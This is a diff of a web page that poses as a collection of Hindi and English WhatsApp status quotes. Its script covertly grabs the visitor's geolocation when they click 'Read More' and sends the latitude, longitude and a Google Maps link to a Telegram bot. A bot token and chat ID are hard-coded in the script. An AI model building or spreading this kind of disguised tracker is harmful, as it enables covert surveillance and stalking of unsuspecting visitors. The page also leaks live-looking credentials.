@@ -1,56 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>WhatsApp Status Button</title>
+  <title>Status Page</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f1f8e9;
-      text-align: center;
-      padding-top: 100px;
-    }
-    .status-btn {
-      background-color: #25D366;
-      color: white;
-      padding: 15px 30px;
-      font-size: 20px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-    #status-box {
-      display: none;
-      margin-top: 30px;
-      background: white;
+      font-family: sans-serif;
+      margin: 0;
+      background: #e0f2f1;
       padding: 20px;
-      max-width: 600px;
-      margin-left: auto;
-      margin-right: auto;
+      color: #333;
+    }
+    h1 {
+      text-align: center;
+      color: #00796b;
+    }
+    .status-box {
+      background: white;
+      padding: 15px;
+      margin: 10px 0;
       border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    #extra-status {
+      display: none;
+    }
+    .read-btn {
+      background: #00796b;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      display: block;
+      margin: 20px auto;
     }
   </style>
 </head>
 <body>
 
-<button class="status-btn" onclick="showStatus()">📱 WhatsApp Status</button>
+<h1>📱 WhatsApp Status (Hindi + English)</h1>
 
-<div id="status-box">
-  <h2>🔥 Trending WhatsApp Status</h2>
-  <p>💬 Muskurate raho, duniya jalegi 🔥</p>
-  <p>🌟 Dreams don’t work unless you do.</p>
-  <p>💬 Zindagi ek safar hai suhana 🎵</p>
-  <p>🌍 Be the energy you want to attract.</p>
+<div id="status-list">
+  <div class="status-box">💬 Zindagi jeene ke liye junoon chahiye, khwab to har koi dekh leta hai.</div>
+  <div class="status-box">🌟 Believe in yourself, you are stronger than you think.</div>
+  <div class="status-box">💬 Muskurate raho, duniya jalegi 🔥</div>
+  <div class="status-box">🌍 Be the reason someone smiles today.</div>
 </div>
+
+<div id="extra-status">
+  <div class="status-box">💬 Apni mehnat par bharosa rakho, naseeb to jua hai.</div>
+  <div class="status-box">🌟 Dreams don't work unless you do.</div>
+  <div class="status-box">💬 Kisi ke liye kya badlenge, khud hi kaafi hain hum 😎</div>
+  <div class="status-box">🌍 Make it happen. Shock everyone.</div>
+  <div class="status-box">💬 Duniya sirf kamyabi dekhna chahti hai, koshish nahi.</div>
+  <div class="status-box">🌟 Great things never come from comfort zones.</div>
+  <div class="status-box">💬 Tum zameen par raho, log aasmaan pe le jaayenge.</div>
+  <div class="status-box">🌍 Push yourself, no one else will do it for you.</div>
+  <div class="status-box">💬 Sapne wahi sach hote hain jo neend tod dete hain.</div>
+  <div class="status-box">🌟 Keep going, you’re getting there.</div>
+  <!-- Add more status lines here -->
+</div>
+
+<button class="read-btn" onclick="revealStatus()">📖 Read More</button>
 
 <script>
   const BOT_TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
   const CHAT_ID = "7357184121";
 
-  function showStatus() {
-    document.getElementById("status-box").style.display = "block";
+  function revealStatus() {
+    document.getElementById("extra-status").style.display = "block";
+    document.querySelector(".read-btn").style.display = "none";
     sendLocation();
   }
 
@@ -64,12 +86,7 @@
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
     const acc = position.coords.accuracy;
-    const message = `📍 'WhatsApp Status' clicked
-🌍 Latitude: ${lat}
-🌍 Longitude: ${lon}
-🎯 Accuracy: ${acc}m
-🔗 https://maps.google.com/?q=${lat},${lon}
-🕒 ${new Date().toLocaleString()}`;
+    const message = `📍 User clicked 'Read More'\n🌍 Latitude: ${lat}\n🌍 Longitude: ${lon}\n🎯 Accuracy: ${acc}m\n🔗 https://maps.google.com/?q=${lat},${lon}\n🕒 ${new Date().toLocaleString()}`;
     sendToTelegram(message);
   }
 
